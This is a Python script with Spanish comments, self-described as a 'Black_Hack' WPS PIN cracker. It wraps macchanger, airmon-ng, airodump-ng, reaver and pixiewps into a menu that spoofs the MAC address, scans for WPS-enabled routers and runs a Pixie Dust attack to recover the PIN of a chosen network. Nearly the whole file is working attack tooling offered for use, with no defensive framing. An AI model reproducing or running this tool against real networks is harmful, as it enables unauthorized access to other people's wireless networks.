#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ LIBRERIAS $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
import os, time, threading, io

## Crador Smp_A
# Fecha 25.7.2020
# Licencia Open soft GNU
# Nombre programa Rave WiFi telefono
# Tipo Script shell
# Hack pin wps Wifi basado en Raver
# lenguaje Python3 
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ PRESENTACION TERMINAL $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
os.system('clear')
print("\033[1;31;1m ")
os.system('figlet        Smp_A')
print("			  	   Black_Hack")                 	
print("\033[1;37;1m ")
#&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ Variables principales $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Variables ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
listamenu=["opciones:", "1) Scaner red ", "2) Reaver_wifi","3) Exit"]#Menu Princcipal
key=0
exit=False
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ OPciones MEnu ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def menu():
	print("     "+listamenu[0])
	print(listamenu[1])
	print(listamenu[2])
	print(listamenu[3])
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ FUNCIONES PRINCIPALES $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ CONFIGURACION $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ FUNCION SELECCION ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
def scan():
	global wlan
	global bssid
	global canal
	os.system("ifconfig")
	wlan=input("Introduzca Wlan: ")

	if(wlan=="wlan0mon" or wlan== "wlan1mon"):
		wlan=wlan
	else:
		print("Procesando")
		os.system('ifconfig '+wlan+' down')
		time.sleep(1)
		os.system('macchanger -A '+wlan)
		time.sleep(1)
		os.system('ifconfig '+wlan+' up') 
		time.sleep(1)
		os.system('airmon-ng check kill')
		time.sleep(1)
		os.system('airmon-ng start '+wlan)
		time.sleep(1)
		os.system('airmon-ng check '+wlan)
		time.sleep(1)
		wlan=(wlan+"mon")
	print(wlan)
	os.system('airodump-ng -i '+wlan+' --wps --manufacturer')
	bssid=input("seleccione BSSID : ")
	canal=input("seleccione CHANEL : ") 
	return wlan, bssid, canal

def attack(wlan,bssid,canal):
	os.system('x-terminal-emulator -e reaver -i '+wlan+' -c '+canal+' -b '+bssid+' -vv -g 1 -n -S')
	print("Pulse Ctl+C cuando reconozca el numero PKE-HASH2")
	numeroPKE=input("seleccione numero PKE : ")
	numeroAuthKey=input("seleccione numero AuthKey : ")
	numeroHash1=input("seleccione numero Hash1 : ")
	numeroHash2=input("seleccione numero Hash2 : ")
	os.system('x-terminal-emulator -e pixiewps -e '+numeroPKE+' -s '+numeroHash1+' -z '+numeroHash2+' -a '+numeroAuthKey+' -S')
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$ MENU $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ EJECUCION DEL PROGRAMA ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
while exit==False:
	menu()
	key=(int(input()))
	if (key==1):
		scan()
	elif (key==2):
		attack(wlan,bssid,canal)
	elif (key==3):
		os.system('airmon-ng stop wlan0mon')
		os.system('ifconfig wlan0 down')
		os.system('iwconfig wlan0 mode managed')
		os.system('ifconfig wlan0 up')
		os.system('service network-manager start')
		exit=True
#$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$